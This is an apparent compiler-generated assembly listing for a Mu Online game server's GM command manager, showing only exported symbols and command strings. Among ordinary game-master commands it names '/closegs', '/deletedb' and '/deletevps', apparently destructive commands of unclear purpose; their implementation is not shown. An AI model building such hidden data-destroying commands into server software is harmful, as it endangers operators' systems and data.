; Listing generated by Microsoft (R) Optimizing Compiler Version 19.27.29111.0 

	TITLE	C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.cpp
	.686P
	.XMM
	include listing.inc
	.model	flat

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

PUBLIC	?__empty_global_delete@@YAXPAX@Z		; __empty_global_delete
PUBLIC	?__empty_global_delete@@YAXPAXI@Z		; __empty_global_delete
PUBLIC	___local_stdio_printf_options
PUBLIC	__vsnprintf_l
PUBLIC	__vsprintf_l
PUBLIC	_sprintf
PUBLIC	?AtlThrowImpl@ATL@@YGXJ@Z			; ATL::AtlThrowImpl
PUBLIC	?_AtlGetConversionACP@ATL@@YGIXZ		; ATL::_AtlGetConversionACP
PUBLIC	?_AtlGetStringResourceImage@ATL@@YAPBUATLSTRINGRESOURCEIMAGE@1@PAUHINSTANCE__@@PAUHRSRC__@@I@Z ; ATL::_AtlGetStringResourceImage
PUBLIC	?AtlGetStringResourceImage@ATL@@YAPBUATLSTRINGRESOURCEIMAGE@1@PAUHINSTANCE__@@I@Z ; ATL::AtlGetStringResourceImage
PUBLIC	?data@CStringData@ATL@@QAEPAXXZ			; ATL::CStringData::data
PUBLIC	?IsLocked@CStringData@ATL@@QBE_NXZ		; ATL::CStringData::IsLocked
PUBLIC	?IsShared@CStringData@ATL@@QBE_NXZ		; ATL::CStringData::IsShared
PUBLIC	?Release@CStringData@ATL@@QAEXXZ		; ATL::CStringData::Release
PUBLIC	??0?$CSimpleStringT@D$0A@@ATL@@QAE@PAUIAtlStringMgr@1@@Z ; ATL::CSimpleStringT<char,0>::CSimpleStringT<char,0>
PUBLIC	??1?$CSimpleStringT@D$0A@@ATL@@QAE@XZ		; ATL::CSimpleStringT<char,0>::~CSimpleStringT<char,0>
PUBLIC	??4?$CSimpleStringT@D$0A@@ATL@@QAEAAV01@PBD@Z	; ATL::CSimpleStringT<char,0>::operator=
PUBLIC	?Empty@?$CSimpleStringT@D$0A@@ATL@@QAEXXZ	; ATL::CSimpleStringT<char,0>::Empty
PUBLIC	?GetAllocLength@?$CSimpleStringT@D$0A@@ATL@@QBEHXZ ; ATL::CSimpleStringT<char,0>::GetAllocLength
PUBLIC	?GetBuffer@?$CSimpleStringT@D$0A@@ATL@@QAEPADH@Z ; ATL::CSimpleStringT<char,0>::GetBuffer
PUBLIC	?GetLength@?$CSimpleStringT@D$0A@@ATL@@QBEHXZ	; ATL::CSimpleStringT<char,0>::GetLength
PUBLIC	?GetString@?$CSimpleStringT@D$0A@@ATL@@QBEPBDXZ	; ATL::CSimpleStringT<char,0>::GetString
PUBLIC	?ReleaseBufferSetLength@?$CSimpleStringT@D$0A@@ATL@@QAEXH@Z ; ATL::CSimpleStringT<char,0>::ReleaseBufferSetLength
PUBLIC	?SetString@?$CSimpleStringT@D$0A@@ATL@@QAEXPBD@Z ; ATL::CSimpleStringT<char,0>::SetString
PUBLIC	?SetString@?$CSimpleStringT@D$0A@@ATL@@QAEXPBDH@Z ; ATL::CSimpleStringT<char,0>::SetString
PUBLIC	?CopyChars@?$CSimpleStringT@D$0A@@ATL@@SAXPADIPBDH@Z ; ATL::CSimpleStringT<char,0>::CopyChars
PUBLIC	?CopyCharsOverlapped@?$CSimpleStringT@D$0A@@ATL@@SAXPADIPBDH@Z ; ATL::CSimpleStringT<char,0>::CopyCharsOverlapped
PUBLIC	?StringLength@?$CSimpleStringT@D$0A@@ATL@@SAHPBD@Z ; ATL::CSimpleStringT<char,0>::StringLength
PUBLIC	?ThrowMemoryException@?$CSimpleStringT@D$0A@@ATL@@KAXXZ ; ATL::CSimpleStringT<char,0>::ThrowMemoryException
PUBLIC	?Attach@?$CSimpleStringT@D$0A@@ATL@@AAEXPAUCStringData@2@@Z ; ATL::CSimpleStringT<char,0>::Attach
PUBLIC	?Fork@?$CSimpleStringT@D$0A@@ATL@@AAEXH@Z	; ATL::CSimpleStringT<char,0>::Fork
PUBLIC	?GetData@?$CSimpleStringT@D$0A@@ATL@@ABEPAUCStringData@2@XZ ; ATL::CSimpleStringT<char,0>::GetData
PUBLIC	?PrepareWrite@?$CSimpleStringT@D$0A@@ATL@@AAEPADH@Z ; ATL::CSimpleStringT<char,0>::PrepareWrite
PUBLIC	?PrepareWrite2@?$CSimpleStringT@D$0A@@ATL@@AAEXH@Z ; ATL::CSimpleStringT<char,0>::PrepareWrite2
PUBLIC	?Reallocate@?$CSimpleStringT@D$0A@@ATL@@AAEXH@Z	; ATL::CSimpleStringT<char,0>::Reallocate
PUBLIC	?SetLength@?$CSimpleStringT@D$0A@@ATL@@AAEXH@Z	; ATL::CSimpleStringT<char,0>::SetLength
PUBLIC	??0?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAE@PBD@Z ; ATL::CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >::CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >
PUBLIC	??1?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAE@XZ ; ATL::CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >::~CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >
PUBLIC	??4?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAEAAV01@PBD@Z ; ATL::CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >::operator=
PUBLIC	?LoadStringA@?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAEHI@Z ; ATL::CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >::LoadStringA
PUBLIC	?LoadStringA@?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAEHPAUHINSTANCE__@@I@Z ; ATL::CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >::LoadStringA
PUBLIC	?CheckImplicitLoad@?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@AAE_NPBX@Z ; ATL::CStringT<char,StrTraitMFC<char,ATL::ChTraitsCRT<char> > >::CheckImplicitLoad
PUBLIC	??0CTime@ATL@@QAE@_J@Z				; ATL::CTime::CTime
PUBLIC	?Format@CTime@ATL@@QBE?AV?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@2@PBD@Z ; ATL::CTime::Format
PUBLIC	?GetBaseTypeLength@?$ChTraitsCRT@D@ATL@@SAHPB_WH@Z ; ATL::ChTraitsCRT<char>::GetBaseTypeLength
PUBLIC	?ConvertToBaseType@?$ChTraitsCRT@D@ATL@@SAXPADHPB_WH@Z ; ATL::ChTraitsCRT<char>::ConvertToBaseType
PUBLIC	?FindStringResourceInstance@?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@SAPAUHINSTANCE__@@I@Z ; StrTraitMFC<char,ATL::ChTraitsCRT<char> >::FindStringResourceInstance
PUBLIC	?GetDefaultManager@?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@SAPAUIAtlStringMgr@ATL@@XZ ; StrTraitMFC<char,ATL::ChTraitsCRT<char> >::GetDefaultManager
PUBLIC	?_Adopt@_Iterator_base0@std@@QAEXPBX@Z		; std::_Iterator_base0::_Adopt
PUBLIC	?CheckAuthority@@YA_NKPAVOBJECTSTRUCT@@@Z	; CheckAuthority
PUBLIC	?CheckCommand@CGlobalConfig@@QAE_NK@Z		; CGlobalConfig::CheckCommand
PUBLIC	?GetCommandAuthority@CGlobalConfig@@QAEKK@Z	; CGlobalConfig::GetCommandAuthority
PUBLIC	?end@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@QAE?AV?$_Tree_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@2@XZ ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::end
PUBLIC	?find@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@QAE?AV?$_Tree_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@2@ABK@Z ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::find
PUBLIC	?_Getcomp@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@IBEABU?$less@K@2@XZ ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::_Getcomp
PUBLIC	?_Get_scary@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@IAEPAV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@2@XZ ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::_Get_scary
PUBLIC	?_Get_scary@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@IBEPBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@2@XZ ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::_Get_scary
PUBLIC	??R?$less@K@std@@QBE_NABK0@Z			; std::less<unsigned long>::operator()
PUBLIC	?_Get_first@?$_Compressed_pair@U?$less@K@std@@V?$_Compressed_pair@V?$allocator@U?$_Tree_node@U?$pair@$$CBKK@std@@PAX@std@@@std@@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@2@$00@2@$00@std@@QBEABU?$less@K@2@XZ ; std::_Compressed_pair<std::less<unsigned long>,std::_Compressed_pair<std::allocator<std::_Tree_node<std::pair<unsigned long const ,unsigned long>,void *> >,std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > >,1>,1>::_Get_first
PUBLIC	??0?$_Tree_unchecked_const_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@U_Iterator_base0@2@@std@@QAE@PAU?$_Tree_node@U?$pair@$$CBKK@std@@PAX@1@PBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@1@@Z ; std::_Tree_unchecked_const_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > >,std::_Iterator_base0>::_Tree_unchecked_const_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > >,std::_Iterator_base0>
PUBLIC	??D?$_Tree_const_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QBEABU?$pair@$$CBKK@1@XZ ; std::_Tree_const_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >::operator*
PUBLIC	??8?$_Tree_const_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QBE_NABV01@@Z ; std::_Tree_const_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >::operator==
PUBLIC	??9?$_Tree_const_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QBE_NABV01@@Z ; std::_Tree_const_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >::operator!=
PUBLIC	??0?$_Tree_const_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QAE@PAU?$_Tree_node@U?$pair@$$CBKK@std@@PAX@1@PBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@1@@Z ; std::_Tree_const_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >::_Tree_const_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >
PUBLIC	??D?$_Tree_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QBEAAU?$pair@$$CBKK@1@XZ ; std::_Tree_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >::operator*
PUBLIC	??C?$_Tree_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QBEPAU?$pair@$$CBKK@1@XZ ; std::_Tree_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >::operator->
PUBLIC	??0?$_Tree_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QAE@PAU?$_Tree_node@U?$pair@$$CBKK@std@@PAX@1@PBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@1@@Z ; std::_Tree_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >::_Tree_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >
PUBLIC	?GetResetCmdAuthority@CResetSystem@@QAEHXZ	; CResetSystem::GetResetCmdAuthority
PUBLIC	?Size@CTerrainManager@@QAE?BHXZ			; CTerrainManager::Size
PUBLIC	?pointer_to@?$pointer_traits@PAU?$pair@$$CBKK@std@@@std@@SAPAU?$pair@$$CBKK@2@AAU32@@Z ; std::pointer_traits<std::pair<unsigned long const ,unsigned long> *>::pointer_to
PUBLIC	??$_Find@K@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@ABEPAU?$_Tree_node@U?$pair@$$CBKK@std@@PAX@1@ABK@Z ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::_Find<unsigned long>
PUBLIC	??$addressof@U?$pair@$$CBKK@std@@@std@@YAPAU?$pair@$$CBKK@0@AAU10@@Z ; std::addressof<std::pair<unsigned long const ,unsigned long> >
PUBLIC	??$addressof@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@YAPAV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@0@AAV10@@Z ; std::addressof<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >
PUBLIC	??$_Find_lower_bound@K@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@IBE?AU?$_Tree_find_result@PAU?$_Tree_node@U?$pair@$$CBKK@std@@PAX@std@@@1@ABK@Z ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::_Find_lower_bound<unsigned long>
PUBLIC	??$_Lower_bound_duplicate@K@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@IBE_NQAU?$_Tree_node@U?$pair@$$CBKK@std@@PAX@1@ABK@Z ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::_Lower_bound_duplicate<unsigned long>
PUBLIC	??$addressof@$$CBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@YAPBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@0@ABV10@@Z ; std::addressof<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > const >
PUBLIC	??$_Kfn@$$CBKK@?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@SAABKABU?$pair@$$CBKK@1@@Z ; std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0>::_Kfn<unsigned long const ,unsigned long>
PUBLIC	??0CGMCommand@@QAE@XZ				; CGMCommand::CGMCommand
PUBLIC	?Init@CGMCommand@@QAEXXZ			; CGMCommand::Init
PUBLIC	?Add@CGMCommand@@QAEXPADHK@Z			; CGMCommand::Add
PUBLIC	??0CGMMng@@QAE@XZ				; CGMMng::CGMMng
PUBLIC	??1CGMMng@@UAE@XZ				; CGMMng::~CGMMng
PUBLIC	?Init@CGMMng@@QAEXXZ				; CGMMng::Init
PUBLIC	?GetCmd@CGMMng@@QAEHPAD@Z			; CGMMng::GetCmd
PUBLIC	?SearchCmd@CGMMng@@QAE_NPADAAHAAK@Z		; CGMMng::SearchCmd
PUBLIC	?ManagementProc@CGMMng@@QAEHPAVOBJECTSTRUCT@@PADH@Z ; CGMMng::ManagementProc
PUBLIC	?GetTokenString@CGMMng@@QAEPADXZ		; CGMMng::GetTokenString
PUBLIC	?GetTokenNumber@CGMMng@@QAEHXZ			; CGMMng::GetTokenNumber
PUBLIC	?GetTokenNumberEx@CGMMng@@QAEHXZ		; CGMMng::GetTokenNumberEx
PUBLIC	?ManagerInit@CGMMng@@QAEXXZ			; CGMMng::ManagerInit
PUBLIC	?ManagerAdd@CGMMng@@QAEHPADH@Z			; CGMMng::ManagerAdd
PUBLIC	?ManagerDel@CGMMng@@QAEXPAD@Z			; CGMMng::ManagerDel
PUBLIC	?ManagerSendData@CGMMng@@QAEXPADH@Z		; CGMMng::ManagerSendData
PUBLIC	?BattleInfoSend@CGMMng@@QAEXPADE0E@Z		; CGMMng::BattleInfoSend
PUBLIC	?DataSend@CGMMng@@QAEXPAEH@Z			; CGMMng::DataSend
PUBLIC	?_GetUserAbility@CGMMng@@AAEXPAVOBJECTSTRUCT@@PBD@Z ; CGMMng::_GetUserAbility
PUBLIC	?_GetPartyInfo@CGMMng@@AAEXPAVOBJECTSTRUCT@@PBD@Z ; CGMMng::_GetPartyInfo
PUBLIC	?_SummonMonster@CGMMng@@AAEXPAVOBJECTSTRUCT@@PBDH@Z ; CGMMng::_SummonMonster
PUBLIC	?_ClearMonster@CGMMng@@AAEXPAVOBJECTSTRUCT@@H@Z	; CGMMng::_ClearMonster
PUBLIC	?_ClearItem@CGMMng@@AAEXPAVOBJECTSTRUCT@@H@Z	; CGMMng::_ClearItem
PUBLIC	?_ClearInven@CGMMng@@AAEXPAVOBJECTSTRUCT@@@Z	; CGMMng::_ClearInven
PUBLIC	?_SummonCharacter@CGMMng@@AAEXPAVOBJECTSTRUCT@@PBD@Z ; CGMMng::_SummonCharacter
PUBLIC	?_GetObjectType@CGMMng@@AAEHG@Z			; CGMMng::_GetObjectType
PUBLIC	?IncreaseStat@CGMMng@@AAEXPAVOBJECTSTRUCT@@HW4INCREASE_STAT_ENUM@@@Z ; CGMMng::IncreaseStat
PUBLIC	?ResetViewport@CGMMng@@QAEXPAVOBJECTSTRUCT@@@Z	; CGMMng::ResetViewport
PUBLIC	??_GCGMMng@@UAEPAXI@Z				; CGMMng::`scalar deleting destructor'
PUBLIC	?_OptionsStorage@?1??__local_stdio_printf_options@@9@4_KA ; `__local_stdio_printf_options'::`2'::_OptionsStorage
PUBLIC	??_7CGMMng@@6B@					; CGMMng::`vftable'
PUBLIC	?cManager@@3VCGMMng@@A				; cManager
PUBLIC	?KUNDUN_GM_LOG@@3VCLogToFile@@A			; KUNDUN_GM_LOG
PUBLIC	??_C@_0BG@PIGDOKKG@?4?2KUNDUN_EVENT_GM_LOG@	; `string'
PUBLIC	??_C@_0BE@JELMHMFI@KUNDUN_EVENT_GM_LOG@		; `string'
PUBLIC	??_C@_0M@NAACLKOB@?1disconnect@			; `string'
PUBLIC	??_C@_0M@CECLOOK@?1whisperoff@			; `string'
PUBLIC	??_C@_0L@EDCFKOKG@?1whisperon@			; `string'
PUBLIC	??_C@_0L@FCNFKDHF@?1guildmove@			; `string'
PUBLIC	??_C@_0BB@IMEJJNPL@?1guilddisconnect@		; `string'
PUBLIC	??_C@_07JMNOJOCB@?1warend@			; `string'
PUBLIC	??_C@_09EPAPKJCF@?1warstart@			; `string'
PUBLIC	??_C@_08LPJLINAO@?1warstop@			; `string'
PUBLIC	??_C@_05GPBILLLO@?1?$LE?I?$LH?B@		; `string'
PUBLIC	??_C@_05PKOPIGND@?1?F?D?F?$LM@			; `string'
PUBLIC	??_C@_0M@NCLLHGHP@?1?$LI?s?$LN?$LK?E?M?$LM?R?H?$KP@ ; `string'
PUBLIC	??_C@_0M@PCFENPAP@?1?$LI?s?$LN?$LK?E?M?A?$KG?$LA?E@ ; `string'
PUBLIC	??_C@_0M@CKGHABCD@?1?$LO?F?$MA?L?E?$NL?A?$KG?$LA?E@ ; `string'
PUBLIC	??_C@_09HHLKFDID@?1?$MA?N?$LK?$KF?A?$KG?$LA?E@	; `string'
PUBLIC	??_C@_0M@MGPFMLOL@?1?D?$LD?$LI?$KP?E?M?$LM?R?H?$KP@ ; `string'
PUBLIC	??_C@_08NMMECFKO@?1ability@			; `string'
PUBLIC	??_C@_06JICFFAOM@?1party@			; `string'
PUBLIC	??_C@_0P@FBJALDCH@?1summonmonster@		; `string'
PUBLIC	??_C@_0O@OHPCDLEP@?1clearmonster@		; `string'
PUBLIC	??_C@_0L@BMILIDFD@?1clearitem@			; `string'
PUBLIC	??_C@_0M@GPOPOLAO@?1clearinven@			; `string'
PUBLIC	??_C@_0M@EEPBOOJK@?1summonchar@			; `string'
PUBLIC	??_C@_04NILIJCHB@?1war@				; `string'
PUBLIC	??_C@_07DKLNGAJK@?1soccer@			; `string'
PUBLIC	??_C@_05PCNGDGBG@?1move@			; `string'
PUBLIC	??_C@_02ODPMDCNK@?1m@				; `string'
PUBLIC	??_C@_06EIGIJLP@?1gmove@			; `string'
PUBLIC	??_C@_05GPHHBAG@?1make@				; `string'
PUBLIC	??_C@_09PNMFKAIE@?1userstat@			; `string'
PUBLIC	??_C@_06JJEGOPHB@?1trace@			; `string'
PUBLIC	??_C@_0L@KDDCLIK@?1userwatch@			; `string'
PUBLIC	??_C@_09OAOHLHFO@?1?D?o?$LF?P?$LL?s?E?B@	; `string'
PUBLIC	??_C@_07ILODLNBC@?1?D?o?$LF?P?G?G@		; `string'
PUBLIC	??_C@_0M@POALKPHK@?1?D?o?$LF?P?H?$LI?$LK?$LJ?$LH?$KO@ ; `string'
PUBLIC	??_C@_0BA@DDJDJNOB@?1?D?o?$LF?P?C?J?$LE?g?H?$LI?$LK?$LJ?$LH?$KO@ ; `string'
PUBLIC	??_C@_0O@FADBPHEL@?1?D?o?$LF?P?H?$LI?$LK?$LJ?$LN?C?$LA?$KD@ ; `string'
PUBLIC	??_C@_05KKDONAKI@?1time@			; `string'
PUBLIC	??_C@_08OLBJHFEG@?1pkclear@			; `string'
PUBLIC	??_C@_07LFKEFJEH@?1online@			; `string'
PUBLIC	??_C@_04ENDHGELN@?1str@				; `string'
PUBLIC	??_C@_04GHPCCKFG@?1dex@				; `string'
PUBLIC	??_C@_04DIENADCK@?1vit@				; `string'
PUBLIC	??_C@_04CMHHMOMO@?1ene@				; `string'
PUBLIC	??_C@_04MAAHHBCN@?1com@				; `string'
PUBLIC	??_C@_08GFOOHMGK@?1joinpvp@			; `string'
PUBLIC	??_C@_06DAJLIHEI@?1reset@			; `string'
PUBLIC	??_C@_08NKGJGPDF@?1vipinfo@			; `string'
PUBLIC	??_C@_02FILGPIH@?1q@				; `string'
PUBLIC	??_C@_02FDNBMIAB@?1w@				; `string'
PUBLIC	??_C@_05KHGEPAAH@?1fire@			; `string'
PUBLIC	??_C@_04FJAIGIIB@?1ban@				; `string'
PUBLIC	??_C@_07EGGDJHFC@?1offafk@			; `string'
PUBLIC	??_C@_09BLALOGBO@?1offmoney@			; `string'
PUBLIC	??_C@_09DIPPLEHO@?1offlevel@			; `string'
PUBLIC	??_C@_0O@IGOCFEEE@?1autoattackon@		; `string'
PUBLIC	??_C@_0P@EMIDPKEE@?1autoattackoff@		; `string'
PUBLIC	??_C@_09EAHJBN@?1duelinfo@			; `string'
PUBLIC	??_C@_0N@JOEFOOKK@?1offsellcash@		; `string'
PUBLIC	??_C@_08BHGJMCCG@?1botshop@			; `string'
PUBLIC	??_C@_08FEGOPANL@?1closegs@			; `string'
PUBLIC	??_C@_09DHDHCCDM@?1deletedb@			; `string'
PUBLIC	??_C@_0L@MOPIIJJK@?1deletevps@			; `string'
PUBLIC	??_C@_01CLKCMJKC@?5@				; `string'
PUBLIC	??_C@_0BI@CHDHMMGL@PK?$LL?s?E?B?$LI?$KG?5?C?J?$LB?b?H?$KN?5?G?U?$LE?O?$LE?Y?4@ ; `string'
PUBLIC	??_C@_0CB@CPEOIFGE@?$FL?5?$CFs?5?$FN?5?$MA?G?5?$LO?F?$MA?L?E?$NL?5?$MA?N?$LF?$KG?$LN?$LK?5?$DN?5?$CFd?0?5?$CF@ ; `string'
PUBLIC	??_C@_0BD@KEDKPOLC@?$LO?K?$LM?v?5?$LO?x?$LE?B?5?$LO?F?$MA?L?E?$NL?4?4@ ; `string'
PUBLIC	??_C@_0CH@KPNIMDDJ@?$LN?$LK?E?H?5?$LM?$LD?A?$KE?$MA?L?5?$MA?$NP?$LI?x?5?$LF?F?$LN?$MA?$LE?O?$LE?Y?4?$CI?$LB?b?$LK?$LL@ ; `string'
PUBLIC	??_C@_0CD@MKLNLHDL@?$LN?$LK?E?H?5?$LM?$LD?A?$KE?$MA?L?5?$MA?$NP?$LI?x?5?$LF?F?$LN?$MA?$LE?O?$LE?Y?4?$CI?G?U?C?J@ ; `string'
PUBLIC	??_C@_0CB@IKIHDOJD@?$MA?$LI?H?e?H?e?5?D?$LD?$LI?$KP?E?M?5?$LN?$LK?E?H?5?$MA?g?$LM?$LD?A?$KE?5?$LP?O?$LH?a?$CB@ ; `string'
PUBLIC	??_C@_0BD@EIKIGGHM@Modi?4Stat?5Complete@	; `string'
PUBLIC	??_C@_07BKDMMMJL@?$MA?$PM?A?w?4?4?4@		; `string'
PUBLIC	??_C@_0O@MIJMFKGB@User?5Watching@		; `string'
PUBLIC	??_C@_0EB@OBAKBBAF@Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs?5?$FN?7?$FL?5?$CFs?5?$FN@ ; `string'
PUBLIC	??_C@_0O@MKODHHAM@?$CFs?5?3?5?$LA?$KI?$LN?C?G?X?A?$KG@ ; `string'
PUBLIC	??_C@_0O@GFMKDCHA@?$CFs?5?3?5?$LA?$KI?$LN?C?$LN?C?$MA?$NL@ ; `string'
PUBLIC	??_C@_0O@HBGDJJNF@User?5Tracking@		; `string'
PUBLIC	??_C@_0EA@DPOHDNID@Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs?5?$FN?7?$FL?5?$CFs?5?$FN@ ; `string'
PUBLIC	??_C@_0BH@NPPBDIDN@User?5Stat?5?$CIconnection?$CJ@ ; `string'
PUBLIC	??_C@_0CM@FGOOHLMI@Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs?5?$FN?7?$FL?5?$CFs?5?$FN@ ; `string'
PUBLIC	??_C@_0BA@MEJDKKFB@User?5Disconnect@		; `string'
PUBLIC	??_C@_0BB@BCPFBGGF@Guild?5Disconnect@		; `string'
PUBLIC	??_C@_0BB@FJGOBKEK@User?5SetPosition@		; `string'
PUBLIC	??_C@_0BC@HIAMIIED@Guild?5SetPosition@		; `string'
PUBLIC	??_C@_0BD@EFECDMGE@Start?5BattleSoccer@		; `string'
PUBLIC	??_C@_0BC@DPMLLFMM@Stop?5BattleSoccer@		; `string'
PUBLIC	??_C@_0N@GPDFKJGB@End?5GuildWar@		; `string'
PUBLIC	??_C@_0N@KILIGKJC@Ban?5Chatting@		; `string'
PUBLIC	??_C@_0BC@MOJFCJJN@Free?5Ban?9Chatting@		; `string'
PUBLIC	??_C@_0N@KELDLAKD@Set?5GuildWar@		; `string'
PUBLIC	??_C@_02LIELOMNJ@on@				; `string'
PUBLIC	??_C@_03MCADLMAF@off@				; `string'
PUBLIC	??_C@_0N@DFKMJHLF@?D?o?$LF?P?$LL?s?E?B?$LK?$LI?$LB?b@ ; `string'
PUBLIC	??_C@_0DF@GLPGGMOI@?$FLKUNDUN?$FN?5Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs@ ; `string'
PUBLIC	??_C@_0BI@FABGHCEJ@?D?o?$LF?P?5HP?5?$DN?5?$CF7?40f?5?1?5?$CF7?40f@ ; `string'
PUBLIC	??_C@_0DC@DLDEMFJO@?D?o?$LF?P?5HP?5?C?J?$LE?g?H?$LI?$LK?$LJ?$LH?$KO?5?$DN?5?$CFd?5?H?$LI?$LK?$LJ?$LH?$KO?5@ ; `string'
PUBLIC	??_C@_0L@LMJDAGMB@?D?o?$LF?PHP?$LM?$LD?A?$KE@	; `string'
PUBLIC	??_C@_0BB@FDCEFCLA@?D?o?$LF?PHP?H?$LI?$LK?$LJ?$LH?$KO?$LM?$LD?A?$KE@ ; `string'
